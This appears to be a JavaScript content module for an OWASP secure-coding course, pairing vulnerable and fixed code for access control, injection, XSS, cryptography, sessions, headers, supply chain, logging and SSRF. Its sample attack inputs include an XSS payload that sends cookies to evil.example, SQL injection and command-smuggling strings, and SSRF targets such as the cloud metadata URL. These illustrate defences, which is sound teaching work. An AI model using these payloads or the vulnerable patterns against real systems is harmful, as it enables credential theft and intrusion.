/*
 * OWASP course extension — one hands-on section per major risk, each with a
 * "vulnerable vs fixed" example. Python examples use only the standard library
 * and run with `python demo.py`; config examples are copy-ready.
 */

export default {
  examples: {
    'Mitigation Strategies': [
      {
        title: 'Allow-list input validation',
        language: 'python',
        explanation: 'Validate **what is allowed** (type, length, format, range) rather than trying to block known-bad characters. Validation is a first line of defence — still use parameterised queries and output encoding.',
        code: `import re

USERNAME = re.compile(r"^[a-z0-9_]{3,20}$")
ALLOWED_SORT = {"name", "created_at", "price"}

def validate_signup(data: dict) -> dict:
    errors = {}
    if not USERNAME.fullmatch(str(data.get("username", ""))):
        errors["username"] = "3-20 chars: a-z, 0-9, _"
    age = data.get("age")
    if not isinstance(age, int) or not 13 <= age <= 120:
        errors["age"] = "integer between 13 and 120"
    if data.get("sort", "name") not in ALLOWED_SORT:     # never interpolate raw column names
        errors["sort"] = f"one of {sorted(ALLOWED_SORT)}"
    return errors

print(validate_signup({"username": "ada_l", "age": 36, "sort": "price"}))
print(validate_signup({"username": "<script>", "age": "36", "sort": "name; DROP TABLE users"}))`,
        output: `{}
{'username': '3-20 chars: a-z, 0-9, _', 'age': 'integer between 13 and 120', 'sort': "one of ['created_at', 'name', 'price']"}`,
      },
    ],
  },

  sections: [
    {
      title: 'Top 10: 2021 vs 2025 Edition',
      after: 'The OWASP Top 10 (Current)',
      content: `OWASP refreshes the list every few years from contributed vulnerability data and a community survey. The **2025** edition reshuffles the 2021 list:

| 2025 | Category | Change vs 2021 |
|---|---|---|
| A01 | Broken Access Control | still #1; now **includes SSRF** (was A10) |
| A02 | Security Misconfiguration | up from A05 |
| A03 | Software Supply Chain Failures | new — broadens *Vulnerable and Outdated Components* (A06) |
| A04 | Cryptographic Failures | down from A02 |
| A05 | Injection | down from A03 (XSS is still part of it) |
| A06 | Insecure Design | down from A04 |
| A07 | Authentication Failures | renamed from *Identification and Authentication Failures* |
| A08 | Software or Data Integrity Failures | same position |
| A09 | Security Logging & Alerting Failures | renamed — emphasis on *alerting* |
| A10 | Mishandling of Exceptional Conditions | new — fail-open logic, leaky errors, unchecked failures |

### How to use the list

- It is an **awareness document**, not a complete standard. For verifiable requirements use **OWASP ASVS**; for testing use the **Web Security Testing Guide (WSTG)**.
- Map each category to concrete controls in your stack (the sections below do this with code).
- Use it in threat modelling, code review checklists and developer training.`,
      keyPoints: [
        'Broken Access Control remains the most common serious risk.',
        'SSRF is folded into access control in 2025; supply-chain risk gets its own category.',
        'Mishandling exceptional conditions (fail-open, leaky errors) is new in 2025.',
        'Use ASVS for requirements and WSTG for test cases — the Top 10 is for awareness.',
      ],
    },
    {
      title: 'Broken Access Control & IDOR',
      after: 'Top 10: 2021 vs 2025 Edition',
      content: `Access control enforces **who can do what to which object**. The most common bug is an **IDOR** (Insecure Direct Object Reference): \`GET /invoices/1042\` returns any invoice because the server only checks that the user is logged in, not that they **own** invoice 1042.

### Typical failures

- Missing ownership/tenant check on reads, updates or deletes
- Hiding admin buttons in the UI but not protecting the API endpoint
- Trusting role or user ID values sent by the client (hidden fields, JWT claims without verification)
- Permissive CORS, directory listing, force browsing to \`/admin\`
- Privilege escalation through mass assignment (\`{"role": "admin"}\` in a profile update)

### Controls

- **Deny by default**; check permissions server-side on every request.
- Scope queries by owner/tenant: \`WHERE id = ? AND owner_id = ?\`.
- Centralise authorisation (policy functions, middleware) rather than ad-hoc checks.
- Return **404** instead of 403 for objects the user must not know exist.
- Write tests for "user A cannot access user B's data".`,
      code: `from dataclasses import dataclass

@dataclass
class User:
    id: int
    roles: set

INVOICES = {
    1041: {"id": 1041, "owner_id": 1, "total": 120},
    1042: {"id": 1042, "owner_id": 2, "total": 990},
}

class NotFound(Exception): ...

# VULNERABLE: authenticated == authorised
def get_invoice_vulnerable(user: User, invoice_id: int):
    return INVOICES[invoice_id]

# FIXED: central policy + ownership check, deny by default
def can_read_invoice(user: User, invoice: dict) -> bool:
    return invoice["owner_id"] == user.id or "billing_admin" in user.roles

def get_invoice(user: User, invoice_id: int):
    invoice = INVOICES.get(invoice_id)
    if invoice is None or not can_read_invoice(user, invoice):
        raise NotFound()                    # don't reveal that it exists
    return invoice

# Mass assignment: only copy allowed fields from the request body
EDITABLE = {"display_name", "email"}
def update_profile(profile: dict, body: dict) -> dict:
    return {**profile, **{k: v for k, v in body.items() if k in EDITABLE}}

alice, admin = User(1, {"customer"}), User(9, {"billing_admin"})
print("vulnerable:", get_invoice_vulnerable(alice, 1042))
for who, inv in [(alice, 1041), (alice, 1042), (admin, 1042)]:
    try:
        print(f"user {who.id} -> {get_invoice(who, inv)}")
    except NotFound:
        print(f"user {who.id} -> 404 for invoice {inv}")
print(update_profile({"display_name": "Al", "role": "customer"}, {"display_name": "Alice", "role": "admin"}))`,
      codeLabel: 'IDOR and mass assignment — vulnerable vs fixed',
      codeLanguage: 'python',
      keyPoints: [
        'Authentication says who you are; authorisation must be checked per object.',
        'Scope every query by owner or tenant and deny by default.',
        'Never trust roles, IDs or prices sent by the client.',
        'Use allow-lists of editable fields to prevent mass assignment.',
      ],
    },
    {
      title: 'Injection: SQL & OS Commands',
      after: 'Broken Access Control & IDOR',
      content: `Injection happens when **untrusted data is concatenated into a command** that an interpreter executes: SQL, NoSQL, OS shell, LDAP, XPath, template engines.

### SQL injection

\`"SELECT * FROM users WHERE name = '" + name + "'"\` with \`name = "' OR '1'='1"\` returns every user. The fix is **parameterised queries** — the driver sends data separately from the SQL text, so it can never change the query's structure.

| Language | Safe form |
|---|---|
| Python DB-API | \`cur.execute("... WHERE id = ?", (id,))\` |
| Java JDBC | \`PreparedStatement\` with \`setString\` |
| C# ADO.NET | \`SqlCommand\` + \`Parameters.AddWithValue\` |
| Node (pg) | \`client.query("... $1", [id])\` |

Identifiers (column/table names, \`ORDER BY\`) cannot be parameters — map them through an **allow-list**.

### OS command injection

Never pass user input through a shell. Call the program with an **argument list** (\`subprocess.run([...])\`, \`shell=False\`) and validate the values.`,
      code: `import sqlite3, subprocess, sys

db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, is_admin INTEGER);
INSERT INTO users (name, is_admin) VALUES ('alice', 0), ('bob', 0), ('root', 1);
""")

attack = "nobody' OR '1'='1"

# VULNERABLE: string concatenation
rows = db.execute(f"SELECT name FROM users WHERE name = '{attack}'").fetchall()
print("concatenated:", rows)                       # every user leaks

# FIXED: parameterised query
rows = db.execute("SELECT name FROM users WHERE name = ?", (attack,)).fetchall()
print("parameterised:", rows)                      # []

# Identifiers: allow-list instead of interpolating user input
SORTABLE = {"name": "name", "id": "id"}
def list_users(sort: str):
    column = SORTABLE.get(sort, "id")
    return db.execute(f"SELECT name FROM users ORDER BY {column}").fetchall()
print(list_users("name; DROP TABLE users"))

# OS commands: argument list, no shell
filename = "report.txt; echo HACKED"
result = subprocess.run([sys.executable, "-c", "import sys; print('arg:', sys.argv[1])", filename],
                        capture_output=True, text=True, check=True)
print(result.stdout.strip())                       # the ; is just part of the argument`,
      codeLabel: 'SQL and command injection — vulnerable vs fixed',
      codeLanguage: 'python',
      keyPoints: [
        'Parameterised queries are the fix for SQL injection — escaping is not enough.',
        'Use allow-lists for identifiers such as sort columns and table names.',
        'ORMs are safe by default, but raw-SQL helpers still need parameters.',
        'Run external programs with argument lists and never `shell=True` on user input.',
      ],
    },
    {
      title: 'Cross-Site Scripting (XSS)',
      after: 'Injection: SQL & OS Commands',
      content: `XSS is injection into **HTML/JavaScript**: an attacker's script runs in a victim's browser with their session.

| Type | Where the payload lives |
|---|---|
| Stored | saved in the DB (comments, profiles) and shown to others |
| Reflected | echoed from the URL/request into the response |
| DOM-based | client-side JS writes untrusted data into the DOM (\`innerHTML\`, \`eval\`) |

### Defences (layered)

1. **Contextual output encoding** — templating engines (Jinja2, Razor, React JSX, Angular) escape by default. Avoid escape hatches: \`|safe\`, \`@Html.Raw\`, \`dangerouslySetInnerHTML\`, \`v-html\`, \`innerHTML\`.
2. **Sanitise** rich HTML with an allow-list library (DOMPurify, bleach/nh3) when users must submit HTML.
3. **Content-Security-Policy** blocks inline scripts and unknown origins even if a payload slips through.
4. **HttpOnly** cookies keep session tokens away from JavaScript.
5. In JS, use \`textContent\` instead of \`innerHTML\`.`,
      code: `import html, json, secrets

comment = '<img src=x onerror="fetch(\\'//evil.example/?c=\\'+document.cookie)">'

# VULNERABLE: raw interpolation into HTML
unsafe = f"<p>{comment}</p>"

# FIXED: encode for the HTML context
safe = f"<p>{html.escape(comment)}</p>"
print(unsafe)
print(safe)

# Different contexts need different encoding:
user_value = '</script><script>alert(1)</script>'
attr = f'<input value="{html.escape(user_value, quote=True)}">'          # HTML attribute
js_data = json.dumps({"q": user_value}).replace("</", "<\\\\/")           # inside <script>
print(attr)
print(f"<script>const state = {js_data};</script>")

# Defence in depth: a strict CSP with a per-response nonce
nonce = secrets.token_urlsafe(16)
csp = (f"default-src 'self'; script-src 'self' 'nonce-{nonce}'; object-src 'none'; "
       "base-uri 'none'; frame-ancestors 'none'")
print("Content-Security-Policy:", csp)`,
      codeLabel: 'Context-aware encoding plus a nonce-based CSP',
      codeLanguage: 'python',
      keyPoints: [
        'Encode output for its context: HTML body, attribute, JavaScript, URL.',
        'Rely on framework auto-escaping and avoid raw-HTML escape hatches.',
        'Sanitise user-supplied HTML with an allow-list sanitizer.',
        'A strict Content-Security-Policy limits the damage of any XSS that slips through.',
      ],
    },
    {
      title: 'Cryptographic Failures & Password Storage',
      after: 'Cross-Site Scripting (XSS)',
      content: `Protect data **in transit** (TLS everywhere, HSTS) and **at rest** (encryption, key management), and never invent your own crypto.

### Common failures

| Failure | Fix |
|---|---|
| Passwords hashed with MD5/SHA-1/SHA-256 | slow, salted KDF: **Argon2id**, **scrypt**, **bcrypt**, PBKDF2 (600k+ iterations) |
| Hard-coded keys / secrets in Git | secret manager (Vault, AWS Secrets Manager, Key Vault) + rotation |
| \`random\` for tokens | \`secrets\` module / CSPRNG |
| Comparing MACs with \`==\` | constant-time \`hmac.compare_digest\` |
| ECB mode, static IVs | authenticated encryption: **AES-GCM**, ChaCha20-Poly1305 |
| HTTP or TLS 1.0/1.1 | TLS 1.2+ only, HSTS |
| Sensitive data in logs/URLs | classify data, minimise, mask |

Store only what you need — data you don't keep cannot leak.`,
      code: `import hashlib, hmac, secrets, base64

# Password hashing with scrypt (stdlib). Argon2id via argon2-cffi is also excellent.
N, R, P = 2**14, 8, 1

def hash_password(password: str) -> str:
    salt = secrets.token_bytes(16)                     # unique per password
    digest = hashlib.scrypt(password.encode(), salt=salt, n=N, r=R, p=P, dklen=32)
    return "scrypt$" + base64.b64encode(salt).decode() + "$" + base64.b64encode(digest).decode()

def verify_password(password: str, stored: str) -> bool:
    _, salt_b64, digest_b64 = stored.split("$")
    salt, expected = base64.b64decode(salt_b64), base64.b64decode(digest_b64)
    actual = hashlib.scrypt(password.encode(), salt=salt, n=N, r=R, p=P, dklen=32)
    return hmac.compare_digest(actual, expected)       # constant time

stored = hash_password("correct horse battery staple")
print(stored[:40] + "...")
print(verify_password("correct horse battery staple", stored), verify_password("guess", stored))
print("same password, different hash:", hash_password("x") != hash_password("x"))

# VULNERABLE: fast unsalted hash — identical inputs give identical, crackable hashes
print("sha256:", hashlib.sha256(b"password123").hexdigest()[:16], "...")

# Tokens: use the secrets module, never random
reset_token = secrets.token_urlsafe(32)
api_key = "sk_" + secrets.token_hex(24)
print(len(reset_token), api_key[:8] + "...")

# Signed values (e.g. webhooks) verified in constant time
key = secrets.token_bytes(32)
body = b'{"event":"paid","amount":100}'
sig = hmac.new(key, body, hashlib.sha256).hexdigest()
print("signature ok:", hmac.compare_digest(sig, hmac.new(key, body, hashlib.sha256).hexdigest()))`,
      codeLabel: 'Salted scrypt hashes, secure tokens and HMAC checks',
      codeLanguage: 'python',
      keyPoints: [
        'Hash passwords with a slow, salted KDF such as Argon2id, scrypt or bcrypt.',
        'Generate tokens with a CSPRNG (`secrets`) and compare secrets in constant time.',
        'Use TLS 1.2+ with HSTS for data in transit and AES-GCM for data at rest.',
        'Keep keys in a secret manager and rotate them — never in source control.',
      ],
    },
    {
      title: 'Authentication & Session Management',
      after: 'Cryptographic Failures & Password Storage',
      content: `Authentication failures let attackers **guess, steal or reuse** identities.

### Controls checklist

- **MFA** for all users, mandatory for admins; prefer passkeys/WebAuthn.
- **Rate-limit and throttle** login, OTP and password-reset endpoints; add exponential delays.
- Check new passwords against **breached-password lists**; require length (≥ 12) over complexity rules.
- **Generic errors**: "Invalid username or password" — never reveal which one was wrong.
- **Session IDs**: long random values, regenerated after login, invalidated on logout and after idle/absolute timeouts.
- **Cookies**: \`Secure; HttpOnly; SameSite=Lax\` (or \`Strict\`), \`__Host-\` prefix.
- **Password reset**: single-use, short-lived tokens; don't log them.
- **JWTs**: verify signature and \`alg\`, \`exp\`, \`aud\`, \`iss\`; keep them short-lived.`,
      code: `import time, secrets
from collections import defaultdict

FAILED = defaultdict(list)             # in production: Redis with expiring keys
MAX_ATTEMPTS, WINDOW = 5, 15 * 60
USERS = {"ada": "pw-hash-placeholder"}

def check_password(username, password):
    return username in USERS and password == "s3cret-pass"   # stand-in for verify_password()

def login(username: str, password: str, ip: str, now=None):
    now = now or time.time()
    key = f"{username}|{ip}"
    FAILED[key] = [t for t in FAILED[key] if now - t < WINDOW]
    if len(FAILED[key]) >= MAX_ATTEMPTS:
        return 429, "Too many attempts. Try again later."
    if not check_password(username, password):
        FAILED[key].append(now)
        return 401, "Invalid username or password"            # generic message
    FAILED.pop(key, None)
    session_id = secrets.token_urlsafe(32)                     # new ID after login
    cookie = (f"__Host-session={session_id}; Path=/; Secure; HttpOnly; "
              "SameSite=Lax; Max-Age=1800")
    return 200, cookie

for attempt in range(6):
    print(attempt + 1, login("ada", "wrong", "203.0.113.7"))
print(login("ada", "s3cret-pass", "198.51.100.2")[1][:40] + "...")`,
      codeLabel: 'Throttled login with generic errors and hardened cookies',
      codeLanguage: 'python',
      keyPoints: [
        'Throttle authentication endpoints per account and per IP.',
        'Return the same error for unknown users and wrong passwords.',
        'Regenerate the session ID on login and set Secure, HttpOnly and SameSite.',
        'Offer MFA or passkeys and block known-breached passwords.',
      ],
    },
    {
      title: 'Security Misconfiguration & Headers',
      after: 'Authentication & Session Management',
      content: `Misconfiguration is now the **#2** risk: default credentials, verbose errors, open storage buckets, unnecessary services, missing hardening.

### Hardening checklist

- Disable debug mode, directory listing and stack traces in production.
- Remove default accounts, sample apps and unused endpoints (\`/actuator\`, \`/phpinfo.php\`).
- Least-privilege cloud IAM; **block public access** on storage buckets by default.
- Same hardened config in every environment, built from code (IaC) and scanned (Checkov, tfsec, ScoutSuite).

### Security headers

| Header | Value |
|---|---|
| \`Strict-Transport-Security\` | \`max-age=63072000; includeSubDomains; preload\` |
| \`Content-Security-Policy\` | \`default-src 'self'; object-src 'none'; frame-ancestors 'none'\` |
| \`X-Content-Type-Options\` | \`nosniff\` |
| \`Referrer-Policy\` | \`strict-origin-when-cross-origin\` |
| \`Permissions-Policy\` | \`camera=(), microphone=(), geolocation=()\` |
| \`Cross-Origin-Opener-Policy\` | \`same-origin\` |

Check a site with **securityheaders.com** or Mozilla **Observatory**.`,
      code: `# /etc/nginx/conf.d/app.conf — TLS + security headers in front of an app
server {
    listen 443 ssl;
    http2 on;
    server_name app.example.com;

    ssl_certificate     /etc/letsencrypt/live/app.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/app.example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;

    server_tokens off;                       # hide nginx version
    autoindex off;                           # no directory listing
    client_max_body_size 10m;

    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    location ~ /\\.(git|env|svn) { deny all; }  # never serve dotfiles
    location /actuator { deny all; }

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

server {                                     # redirect plain HTTP
    listen 80;
    server_name app.example.com;
    return 301 https://$host$request_uri;
}`,
      codeLabel: 'Hardened nginx server block',
      codeLanguage: 'nginx',
      keyPoints: [
        'Turn off debug output, directory listing and default accounts in production.',
        'Send HSTS, CSP, nosniff, Referrer-Policy and Permissions-Policy headers.',
        'Block access to dotfiles and management endpoints at the edge.',
        'Define configuration as code and scan it so every environment is hardened.',
      ],
    },
    {
      title: 'Supply Chain & Vulnerable Components',
      after: 'Security Misconfiguration & Headers',
      content: `Most application code is third-party. Supply-chain risks include **known-vulnerable** dependencies, **malicious packages** (typosquatting, hijacked maintainers), and **tampered builds**.

### Controls

| Control | Tooling |
|---|---|
| Inventory (SBOM) | CycloneDX, Syft, \`npm sbom\` |
| Known-CVE scanning | \`npm audit\`, \`pip-audit\`, \`dotnet list package --vulnerable\`, OWASP Dependency-Check, Dependabot, Snyk |
| Reproducible installs | lockfiles + \`npm ci\` / \`pip install --require-hashes\` |
| Integrity of CDN assets | Subresource Integrity (\`integrity="sha384-..."\`) |
| Signed artifacts & provenance | Sigstore/cosign, SLSA, signed commits |
| CI hardening | pin actions by SHA, least-privilege tokens, protected branches |

Update dependencies **continuously** in small steps — a two-year-old framework upgrade is far riskier than weekly patch bumps.`,
      code: `# Inventory and scan dependencies (run in CI on every PR and nightly)
npm ci                                   # install exactly what package-lock.json says
npm audit --audit-level=high             # fail on high/critical advisories
npm sbom --sbom-format cyclonedx > sbom.json

python -m pip install pip-audit
pip-audit -r requirements.txt            # PyPI advisory database
pip install --require-hashes -r requirements.lock   # hashes pinned with pip-compile --generate-hashes

dotnet list package --vulnerable --include-transitive

# Subresource Integrity hash for a CDN file
curl -s https://cdn.example.com/lib.min.js | openssl dgst -sha384 -binary | openssl base64 -A
# <script src="https://cdn.example.com/lib.min.js"
#         integrity="sha384-<hash>" crossorigin="anonymous"></script>

# Verify a signed container image before deploying
cosign verify --certificate-identity-regexp 'https://github.com/acme/.+' \\
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \\
  ghcr.io/acme/api:1.4.2`,
      codeLabel: 'Dependency scanning, SBOM, SRI and signature checks',
      codeLanguage: 'bash',
      keyPoints: [
        'Keep an SBOM so you know what you ship when a new CVE drops.',
        'Scan dependencies in CI and fail builds on high-severity issues.',
        'Use lockfiles with hashes and verify signatures of artifacts you deploy.',
        'Pin CI actions and CDN assets by hash to prevent silent tampering.',
      ],
    },
    {
      title: 'Logging, Monitoring & Alerting',
      after: 'Supply Chain & Vulnerable Components',
      content: `Breaches are often discovered months later because nothing was logged — or logs existed but nobody was alerted.

### What to log (as structured JSON)

- Authentication events: login success/failure, MFA, password reset, lockouts
- Authorisation failures (403/404 on protected objects)
- Input validation failures and server errors
- Admin actions, permission changes, data exports

Include **who, what, when, where** (user id, action, timestamp UTC, source IP, request id).

### What never to log

Passwords, session tokens, API keys, full card numbers, secrets, or excessive personal data — **mask** them.

### Make it actionable

Ship logs centrally (ELK, Splunk, Sentinel), protect them from tampering, define **alerts** (e.g. 20 failed logins/minute from one IP) and practise incident response.`,
      code: `import json, logging, re, sys, time, uuid

SENSITIVE_KEYS = {"password", "token", "authorization", "card_number", "secret"}
CARD = re.compile(r"\\b(\\d{6})\\d{6,9}(\\d{4})\\b")

def redact(value):
    if isinstance(value, dict):
        return {k: "***" if k.lower() in SENSITIVE_KEYS else redact(v) for k, v in value.items()}
    if isinstance(value, str):
        return CARD.sub(r"\\1******\\2", value)
    return value

class JsonFormatter(logging.Formatter):
    def format(self, record):
        event = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(record.created)),
                 "level": record.levelname, "event": record.getMessage()}
        event.update(redact(getattr(record, "ctx", {})))
        return json.dumps(event)

log = logging.getLogger("security")
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(JsonFormatter())
log.addHandler(handler)
log.setLevel(logging.INFO)

request_id = str(uuid.uuid4())[:8]
log.warning("login_failed", extra={"ctx": {
    "user": "ada", "ip": "203.0.113.7", "request_id": request_id,
    "password": "hunter2", "reason": "bad_password"}})
log.info("payment_submitted", extra={"ctx": {
    "user": "ada", "note": "card 4111111111111111 used", "request_id": request_id}})
log.error("access_denied", extra={"ctx": {
    "user": "ada", "resource": "/invoices/1042", "action": "read", "request_id": request_id}})`,
      codeLabel: 'Structured security events with redaction',
      codeLanguage: 'python',
      keyPoints: [
        'Log authentication, authorisation failures and admin actions as structured events.',
        'Redact secrets, tokens and card numbers before they reach the log.',
        'Correlate events with request IDs and UTC timestamps.',
        'Logs only help if alerts fire and someone responds.',
      ],
    },
    {
      title: 'Server-Side Request Forgery (SSRF)',
      after: 'Logging, Monitoring & Alerting',
      content: `SSRF happens when the server fetches a **user-supplied URL** (webhooks, URL previews, PDF renderers, image importers). Attackers point it at internal targets:

- Cloud metadata: \`http://169.254.169.254/latest/meta-data/iam/...\` (steals credentials)
- Internal admin panels: \`http://localhost:8080/admin\`
- Other schemes: \`file:///etc/passwd\`, \`gopher://\`

### Defences

1. **Allow-list** destination hosts or domains whenever possible.
2. Allow only \`https\` (and maybe \`http\`) schemes and standard ports.
3. **Resolve DNS and block private, loopback, link-local and reserved IPs** — then connect to that resolved IP to avoid DNS-rebinding.
4. Disable redirects or re-validate every redirect target.
5. Network controls: egress firewall, IMDSv2 on AWS, separate fetcher service.`,
      code: `import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"https", "http"}
ALLOWED_PORTS = {80, 443}

class UnsafeUrl(ValueError): ...

def resolve(host):
    # Demo resolver; real code uses socket.getaddrinfo(host, None)
    fake_dns = {"api.partner.com": ["93.184.216.34"], "rebind.evil.test": ["127.0.0.1"]}
    if host in fake_dns:
        return fake_dns[host]
    return [info[4][0] for info in socket.getaddrinfo(host, None)]

def validate_outbound_url(url: str) -> tuple[str, str]:
    parts = urlparse(url)
    if parts.scheme not in ALLOWED_SCHEMES:
        raise UnsafeUrl(f"scheme {parts.scheme!r} not allowed")
    if not parts.hostname:
        raise UnsafeUrl("missing host")
    port = parts.port or (443 if parts.scheme == "https" else 80)
    if port not in ALLOWED_PORTS:
        raise UnsafeUrl(f"port {port} not allowed")
    for addr in resolve(parts.hostname):
        ip = ipaddress.ip_address(addr)
        if not ip.is_global:                      # blocks private, loopback, link-local, reserved
            raise UnsafeUrl(f"{parts.hostname} resolves to non-public {ip}")
    return parts.hostname, addr                   # connect to this IP, send Host header

for url in ["https://api.partner.com/hook",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/admin",
            "http://rebind.evil.test/",
            "file:///etc/passwd",
            "https://api.partner.com:8443/"]:
    try:
        print("ALLOW", url, "->", validate_outbound_url(url))
    except UnsafeUrl as e:
        print("BLOCK", url, "-", e)`,
      codeLabel: 'Validating outbound URLs against SSRF',
      codeLanguage: 'python',
      keyPoints: [
        'Treat any server-side fetch of a user-supplied URL as dangerous.',
        'Prefer allow-lists; otherwise block non-public IPs after DNS resolution.',
        'Restrict schemes and ports and re-validate redirects.',
        'Add network-level egress controls and IMDSv2 as defence in depth.',
      ],
    },
  ],
};
